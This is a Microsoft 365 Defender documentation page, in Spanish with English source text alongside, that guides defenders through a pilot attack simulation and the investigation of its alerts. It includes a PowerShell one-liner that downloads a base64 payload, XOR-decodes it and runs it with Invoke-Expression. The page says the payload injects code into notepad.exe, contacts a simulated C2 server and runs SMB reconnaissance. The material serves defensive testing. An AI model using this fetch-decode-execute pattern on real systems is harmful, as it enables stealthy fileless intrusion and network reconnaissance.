---
title: Ejecutar las simulaciones de ataque de Microsoft 365 Defender
description: Ejecute simulaciones de ataque para su proyecto piloto de Microsoft 365 Defender para ver cómo se desarrolla y se corrige rápidamente.
keywords: Simulación de ataque piloto de Protección contra amenazas de Microsoft, ejecutar simulación de ataque piloto de Protección contra amenazas de Microsoft, simular ataques en Protección contra amenazas de Microsoft, proyecto piloto de Protección contra amenazas de Microsoft, seguridad cibernética, amenaza persistente avanzada, seguridad empresarial, dispositivos, dispositivo, identidad, usuarios, datos, aplicaciones, incidentes, investigación y corrección automatizada, búsqueda avanzada
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: f1714eeeb30d1dd4c209d063604e1031369b5ddb
ms.sourcegitcommit: 855719ee21017cf87dfa98cbe62806763bcb78ac
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 01/22/2021
ms.locfileid: "49933059"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="b1fec-104">Ejecutar las simulaciones de ataque de Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="b1fec-104">Run your Microsoft 365 Defender attack simulations</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="b1fec-105">[![Planificación](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="b1fec-105">[![Planning](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span></span><br/>[<span data-ttu-id="b1fec-106">Planeación</span><span class="sxs-lookup"><span data-stu-id="b1fec-106">Planning</span></span>](mtp-pilot-plan.md)|<span data-ttu-id="b1fec-107">[![Preparación](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span><span class="sxs-lookup"><span data-stu-id="b1fec-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span></span><br/>[<span data-ttu-id="b1fec-108">Preparación</span><span class="sxs-lookup"><span data-stu-id="b1fec-108">Preparation</span></span>](prepare-mtpeval.md)|![Simular ataque](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="b1fec-110">Simular ataque</span><span class="sxs-lookup"><span data-stu-id="b1fec-110">Simulate attack</span></span>|<span data-ttu-id="b1fec-111">[![Cerrar y resumir](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="b1fec-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span></span><br/>[<span data-ttu-id="b1fec-112">Cerrar y resumir</span><span class="sxs-lookup"><span data-stu-id="b1fec-112">Close and summarize</span></span>](mtp-pilot-close.md)|
|--|--|--|--|
|||<span data-ttu-id="b1fec-113">*¡Estás aquí!*</span><span class="sxs-lookup"><span data-stu-id="b1fec-113">*You are here!*</span></span>||

<span data-ttu-id="b1fec-114">Actualmente se encuentra en la fase de simulación de ataques.</span><span class="sxs-lookup"><span data-stu-id="b1fec-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="b1fec-115">Después de preparar el entorno piloto, es el momento de probar la administración de incidentes de Microsoft 365 Defender y las capacidades automatizadas de investigación y corrección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-115">After preparing your pilot environment, it's time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="b1fec-116">Te ayudaremos a simular un ataque sofisticado que aprovecha técnicas avanzadas para ocultarte de la detección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="b1fec-117">El ataque enumera las sesiones de bloqueo de mensajes de servidor (SMB) abiertas en controladores de dominio y recupera las direcciones IP recientes de los dispositivos de los usuarios.</span><span class="sxs-lookup"><span data-stu-id="b1fec-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="b1fec-118">Por lo general, esta categoría de ataques no incluye archivos descartados en el dispositivo de la víctima, sino que se producen únicamente en la memoria.</span><span class="sxs-lookup"><span data-stu-id="b1fec-118">This category of attacks usually doesn't include files dropped on the victim's device—they occur solely in memory.</span></span> <span data-ttu-id="b1fec-119">"Viven fuera de la tierra" mediante el uso de herramientas administrativas y del sistema existentes e insertan su código en procesos del sistema para ocultar su ejecución. Este comportamiento les permite eludir la detección y persistir en el dispositivo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-119">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="b1fec-120">En esta simulación, nuestro escenario de ejemplo comienza con un script de PowerShell.</span><span class="sxs-lookup"><span data-stu-id="b1fec-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="b1fec-121">Es posible que se haya engañar a un usuario para que ejecute un script.</span><span class="sxs-lookup"><span data-stu-id="b1fec-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="b1fec-122">O bien, el script puede ejecutarse desde una conexión remota a otro equipo desde un dispositivo infectado anteriormente: el atacante que intenta moverse lateralmente en la red.</span><span class="sxs-lookup"><span data-stu-id="b1fec-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="b1fec-123">La detección de estos scripts puede ser difícil porque los administradores también suelen ejecutar scripts de forma remota para llevar a cabo diversas actividades administrativas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Ataque de PowerShell sin archivos con inserción de procesos y diagrama de ataque de reconocimiento SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="b1fec-125">Durante la simulación, el ataque inserta código de shell en un proceso aparentemente nico.</span><span class="sxs-lookup"><span data-stu-id="b1fec-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="b1fec-126">El escenario requiere el uso de notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="b1fec-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="b1fec-127">Elegimos este proceso para la simulación, pero es más probable que los atacantes se decantan por un proceso de sistema de larga ejecución, como svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="b1fec-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="b1fec-128">A continuación, el código de shell pasa a ponerse en contacto con el servidor de comando y control (C2) del atacante para recibir instrucciones sobre cómo continuar.</span><span class="sxs-lookup"><span data-stu-id="b1fec-128">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="b1fec-129">El script intenta ejecutar consultas de reconocimiento en el controlador de dominio (DC).</span><span class="sxs-lookup"><span data-stu-id="b1fec-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="b1fec-130">El reconocimiento permite a un atacante obtener información sobre la información de inicio de sesión de usuario reciente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="b1fec-131">Una vez que los atacantes tienen esta información, pueden moverse lateralmente en la red para acceder a una cuenta confidencial específica</span><span class="sxs-lookup"><span data-stu-id="b1fec-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="b1fec-132">Para obtener resultados óptimos, sigue las instrucciones de simulación de ataques lo más cerca posible.</span><span class="sxs-lookup"><span data-stu-id="b1fec-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

## <a name="simulation-environment-requirements"></a><span data-ttu-id="b1fec-133">Requisitos del entorno de simulación</span><span class="sxs-lookup"><span data-stu-id="b1fec-133">Simulation environment requirements</span></span>

<span data-ttu-id="b1fec-134">Como ya configuró el entorno piloto durante la fase de preparación, asegúrese de que tiene dos dispositivos para este escenario: un dispositivo de prueba y un controlador de dominio.</span><span class="sxs-lookup"><span data-stu-id="b1fec-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1. <span data-ttu-id="b1fec-135">Compruebe que su espacio empresarial [ha habilitado Microsoft 365 Defender.](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)</span><span class="sxs-lookup"><span data-stu-id="b1fec-135">Verify your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2. <span data-ttu-id="b1fec-136">Compruebe la configuración del controlador de dominio de prueba:</span><span class="sxs-lookup"><span data-stu-id="b1fec-136">Verify your test domain controller configuration:</span></span>

   - <span data-ttu-id="b1fec-137">El dispositivo se ejecuta con Windows Server 2008 R2 o una versión posterior.</span><span class="sxs-lookup"><span data-stu-id="b1fec-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="b1fec-138">El controlador de dominio de prueba [a Microsoft Defender para identidad](https://docs.microsoft.com/azure/security-center/security-center-wdatp) y habilitar la administración [remota.](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="b1fec-138">The test domain controller to [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="b1fec-139">Compruebe que [se ha habilitado la integración de Microsoft Defender para Identidad](https://docs.microsoft.com/cloud-app-security/mdi-integration) y Microsoft Cloud App Security.</span><span class="sxs-lookup"><span data-stu-id="b1fec-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/mdi-integration) have been enabled.</span></span>
   - <span data-ttu-id="b1fec-140">Se crea un usuario de prueba en su dominio: no se necesitan permisos de administrador.</span><span class="sxs-lookup"><span data-stu-id="b1fec-140">A test user is created on your domain – no admin permissions needed.</span></span>

3. <span data-ttu-id="b1fec-141">Compruebe la configuración del dispositivo de prueba:</span><span class="sxs-lookup"><span data-stu-id="b1fec-141">Verify test device configuration:</span></span>

   1. <span data-ttu-id="b1fec-142">El dispositivo se ejecuta con Windows 10 versión 1903 o una versión posterior.</span><span class="sxs-lookup"><span data-stu-id="b1fec-142">Device runs with Windows 10 version 1903 or a later version.</span></span>

   1. <span data-ttu-id="b1fec-143">El dispositivo de prueba está unido al dominio de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-143">Test device is joined to the test domain.</span></span>

   1. <span data-ttu-id="b1fec-144">[Activar el antivirus Windows Defender.](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)</span><span class="sxs-lookup"><span data-stu-id="b1fec-144">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="b1fec-145">Si tiene problemas para habilitar Windows Defender Antivirus, consulte este [tema de solución de problemas.](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="b1fec-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>

   1. <span data-ttu-id="b1fec-146">Compruebe que el dispositivo de prueba [está incorporado en Microsoft Defender para Endpoint).](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="b1fec-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="b1fec-147">Si usas un inquilino existente e implementas grupos de dispositivos, crea un grupo de dispositivos dedicado para el dispositivo de prueba y lo inserta en el nivel superior en la experiencia de usuario de configuración.</span><span class="sxs-lookup"><span data-stu-id="b1fec-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>

## <a name="run-the-attack-scenario-simulation"></a><span data-ttu-id="b1fec-148">Ejecutar la simulación de escenario de ataque</span><span class="sxs-lookup"><span data-stu-id="b1fec-148">Run the attack scenario simulation</span></span>

<span data-ttu-id="b1fec-149">Para ejecutar la simulación de escenario de ataque:</span><span class="sxs-lookup"><span data-stu-id="b1fec-149">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="b1fec-150">Inicia sesión en el dispositivo de prueba con la cuenta de usuario de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-150">Log in to the test device with the test user account.</span></span>

2. <span data-ttu-id="b1fec-151">Abre una Windows PowerShell en el dispositivo de prueba.</span><span class="sxs-lookup"><span data-stu-id="b1fec-151">Open a Windows PowerShell window on the test device.</span></span>

3. <span data-ttu-id="b1fec-152">Copie el siguiente script de simulación:</span><span class="sxs-lookup"><span data-stu-id="b1fec-152">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="b1fec-153">Si abre este documento en un explorador web, es posible que tenga problemas para copiar el texto completo sin perder determinados caracteres ni introducir saltos de línea adicionales.</span><span class="sxs-lookup"><span data-stu-id="b1fec-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="b1fec-154">Descargue este documento y ábralo en Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="b1fec-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="b1fec-155">En el símbolo del sistema, pegue y ejecute el script copiado.</span><span class="sxs-lookup"><span data-stu-id="b1fec-155">At the prompt, paste and run the copied script.</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-156">Si estás ejecutando PowerShell mediante el protocolo de escritorio remoto (RDP), usa el comando Escribir texto del Portapapeles en el cliente RDP porque es posible que la tecla de acceso rápido **CTRL-V** o el método de clic y pegado con el botón derecho no funcionen.</span><span class="sxs-lookup"><span data-stu-id="b1fec-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="b1fec-157">Las versiones recientes de PowerShell a veces tampoco aceptarán ese método, es posible que primero tenga que copiarlo en el Bloc de notas en la memoria, copiarlo en la máquina virtual y, a continuación, pegarlo en PowerShell.</span><span class="sxs-lookup"><span data-stu-id="b1fec-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="b1fec-158">Unos segundos más tarde, <i>notepad.exe</i> se abrirá.</span><span class="sxs-lookup"><span data-stu-id="b1fec-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="b1fec-159">Se insertará un código de ataque simulado en notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="b1fec-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="b1fec-160">Mantenga abierta la instancia del Bloc de notas generada automáticamente para experimentar el escenario completo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="b1fec-161">El código de ataque simulado intentará comunicarse con una dirección IP externa (simulando el servidor C2) y, a continuación, intentará reconocimiento contra el controlador de dominio a través de SMB.</span><span class="sxs-lookup"><span data-stu-id="b1fec-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="b1fec-162">Verá un mensaje en la consola de PowerShell cuando se complete este script.</span><span class="sxs-lookup"><span data-stu-id="b1fec-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="b1fec-163">Para ver la característica De incidentes y respuesta automatizados en acción, mantenga abierto notepad.exe proceso.</span><span class="sxs-lookup"><span data-stu-id="b1fec-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="b1fec-164">Verá que los incidentes automatizados y la respuesta detienen el proceso del Bloc de notas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>

## <a name="investigate-an-incident"></a><span data-ttu-id="b1fec-165">Investigar un incidente</span><span class="sxs-lookup"><span data-stu-id="b1fec-165">Investigate an incident</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-166">Antes de ayudarle a través de esta simulación, vea el siguiente vídeo para ver cómo la administración de incidentes le ayuda a reunir las alertas relacionadas como parte del proceso de investigación, dónde puede encontrarla en el portal y cómo puede ayudarle en sus operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="b1fec-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="b1fec-167">Al cambiar al punto de vista del analista de SOC, ahora puede empezar a investigar el ataque en el portal del Centro de seguridad de Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="b1fec-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span>

1. <span data-ttu-id="b1fec-168">Abra la cola de incidentes del portal del Centro de seguridad de [Microsoft 365](https://security.microsoft.com/incidents) desde cualquier dispositivo.</span><span class="sxs-lookup"><span data-stu-id="b1fec-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2. <span data-ttu-id="b1fec-169">Vaya a **Incidentes desde** el menú.</span><span class="sxs-lookup"><span data-stu-id="b1fec-169">Navigate to **Incidents** from the menu.</span></span>

    ![Captura de pantalla de incidentes como se muestra en el menú del lado izquierdo del Centro de seguridad de Microsoft 365](../../media/mtp/fig1.png)

3. <span data-ttu-id="b1fec-171">El nuevo incidente del ataque simulado aparecerá en la cola de incidentes.</span><span class="sxs-lookup"><span data-stu-id="b1fec-171">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Captura de pantalla de la cola de incidentes](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="b1fec-173">Investigar el ataque como un único incidente</span><span class="sxs-lookup"><span data-stu-id="b1fec-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="b1fec-174">Microsoft 365 Defender correlaciona análisis y agrega todas las alertas e investigaciones relacionadas de diferentes productos en una entidad de incidentes.</span><span class="sxs-lookup"><span data-stu-id="b1fec-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="b1fec-175">Al hacerlo, Microsoft 365 Defender muestra una historia de ataque más amplia, lo que permite al analista de SOC comprender y responder a amenazas complejas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="b1fec-176">Las alertas generadas durante esta simulación se asocian con la misma amenaza y, como resultado, se agregan automáticamente como un único incidente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="b1fec-177">Para ver el incidente:</span><span class="sxs-lookup"><span data-stu-id="b1fec-177">To view the incident:</span></span>

1. <span data-ttu-id="b1fec-178">Navegue a la **cola incidentes.**</span><span class="sxs-lookup"><span data-stu-id="b1fec-178">Navigate to the **Incidents** queue.</span></span>

   ![Captura de pantalla de incidentes desde el menú de navegación](../../media/mtp/fig1.png)

2. <span data-ttu-id="b1fec-180">Seleccione el elemento más reciente haciendo clic en el círculo situado a la izquierda del nombre del incidente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="b1fec-181">Un panel lateral muestra información adicional sobre el incidente, incluidas todas las alertas relacionadas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="b1fec-182">Cada incidente tiene un nombre único que lo describe en función de los atributos de las alertas que incluye.</span><span class="sxs-lookup"><span data-stu-id="b1fec-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   ![Captura de pantalla de la página de incidentes donde se agregan alertas generadas durante la simulación](../../media/mtp/fig4.png)

   <span data-ttu-id="b1fec-184">Las alertas que se muestran en el panel se pueden filtrar en función de los recursos de servicio: Microsoft Defender para Identity, Microsoft Cloud App Security, Microsoft Defender para Endpoint, Microsoft 365 Defender y Microsoft Defender para Office 365.</span><span class="sxs-lookup"><span data-stu-id="b1fec-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="b1fec-185">Seleccione **abrir la página de incidentes** para obtener más información sobre el incidente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-185">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="b1fec-186">En la **página** Incidente, puede ver todas las alertas y la información relacionada con el incidente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="b1fec-187">La información incluye las entidades y activos implicados en la alerta, el origen de detección de las alertas (Microsoft Defender para Identidad, EDR) y la razón por la que se vincularon juntas.</span><span class="sxs-lookup"><span data-stu-id="b1fec-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="b1fec-188">La revisión de la lista de alertas de incidentes muestra la progresión del ataque.</span><span class="sxs-lookup"><span data-stu-id="b1fec-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="b1fec-189">Desde esta vista, puedes ver e investigar las alertas individuales.</span><span class="sxs-lookup"><span data-stu-id="b1fec-189">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="b1fec-190">También puede hacer clic **en Administrar** incidente desde el menú derecho para etiquetar el incidente, asignarlo a sí mismo y agregar comentarios.</span><span class="sxs-lookup"><span data-stu-id="b1fec-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

   ![Captura de pantalla de dónde hacer clic en Administrar incidente](../../media/mtp/fig5a.png)

   ![<span data-ttu-id="b1fec-192">Captura de pantalla de los campos del panel de administración de incidentes donde puede etiquetar el incidente, asignarlo a sí mismo y agregar comentarios</span><span class="sxs-lookup"><span data-stu-id="b1fec-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a><span data-ttu-id="b1fec-193">Revisar alertas generadas</span><span class="sxs-lookup"><span data-stu-id="b1fec-193">Review generated alerts</span></span>

<span data-ttu-id="b1fec-194">Veamos algunas de las alertas generadas durante el ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="b1fec-194">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-195">Solo veremos algunas de las alertas generadas durante el ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="b1fec-195">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="b1fec-196">Según la versión de Windows y los productos de Microsoft 365 Defender que se ejecutan en el dispositivo de prueba, es posible que vea más alertas que aparecen en un orden ligeramente diferente.</span><span class="sxs-lookup"><span data-stu-id="b1fec-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Captura de pantalla de alertas generadas](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="b1fec-198">Alerta: se observó una inserción de procesos sospechosos (origen: Microsoft Defender para Endpoint EDR)</span><span class="sxs-lookup"><span data-stu-id="b1fec-198">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="b1fec-199">Los atacantes avanzados usan métodos sofisticados y sofisticados para conservar la memoria y ocultarse de las herramientas de detección.</span><span class="sxs-lookup"><span data-stu-id="b1fec-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="b1fec-200">Una técnica común es operar desde dentro de un proceso de sistema de confianza en lugar de un ejecutable malintencionado, lo que hace que sea difícil que las herramientas de detección y las operaciones de seguridad detecten el código malintencionado.</span><span class="sxs-lookup"><span data-stu-id="b1fec-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="b1fec-201">Para permitir que los analistas de SOC puedan detectar estos ataques avanzados, los sensores de memoria profunda de Microsoft Defender para Endpoint proporcionan a nuestro servicio en la nube una visibilidad sin precedentes de una variedad de técnicas de inserción de código entre procesos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="b1fec-202">En la figura siguiente se muestra cómo Defender para endpoint detectó y alertó sobre el intento de insertar código en <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="b1fec-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Captura de pantalla de la alerta para la inserción de código potencialmente malintencionado](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="b1fec-204">Alerta: Comportamiento inesperado observado por un proceso ejecutado sin argumentos de línea de comandos (Origen: Microsoft Defender para Endpoint EDR)</span><span class="sxs-lookup"><span data-stu-id="b1fec-204">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="b1fec-205">Las detecciones de Microsoft Defender para puntos de conexión suelen dirigirse al atributo más común de una técnica de ataque.</span><span class="sxs-lookup"><span data-stu-id="b1fec-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="b1fec-206">Este método garantiza la flexibilidad y aumenta la barra para que los atacantes cambien a tácticas más recientes.</span><span class="sxs-lookup"><span data-stu-id="b1fec-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="b1fec-207">Empleamos algoritmos de aprendizaje a gran escala para establecer el comportamiento normal de los procesos comunes dentro de una organización y en todo el mundo, y observamos cuándo estos procesos muestran comportamientos anómalos.</span><span class="sxs-lookup"><span data-stu-id="b1fec-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="b1fec-208">Estos comportamientos anómalos a menudo indican que se introdujo código extraño y se están ejecutando en un proceso de confianza.</span><span class="sxs-lookup"><span data-stu-id="b1fec-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="b1fec-209">Para este escenario, el proceso <i>notepad.exe</i> muestra un comportamiento anómalo, que implica la comunicación con una ubicación externa.</span><span class="sxs-lookup"><span data-stu-id="b1fec-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="b1fec-210">Este resultado es independiente del método específico usado para introducir y ejecutar el código malintencionado.</span><span class="sxs-lookup"><span data-stu-id="b1fec-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="b1fec-211">Dado que esta alerta se basa en modelos de aprendizaje automático que requieren procesamiento back-end adicional, puede tardar algún tiempo antes de que vea esta alerta en el portal.</span><span class="sxs-lookup"><span data-stu-id="b1fec-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

